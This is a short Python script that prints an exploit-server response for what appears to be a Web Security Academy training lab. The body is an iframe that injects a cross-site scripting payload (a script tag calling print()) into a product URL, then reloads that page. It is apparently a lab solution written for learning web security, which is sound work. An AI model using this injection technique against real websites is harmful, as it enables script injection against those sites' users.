LAB_ID = "???"

print("Exploit:")
print(f"""
HTTP/1.1 200
Content-Type: text/html; charset=utf-8
""")
print("Body:")
print(f"""
<iframe src="https://{LAB_ID}.web-security-academy.net/product?productId=1&x=y'><script>print()</script>" onload="location = 'https://{LAB_ID}.web-security-academy.net/product?productId=1'"></iframe>
""")
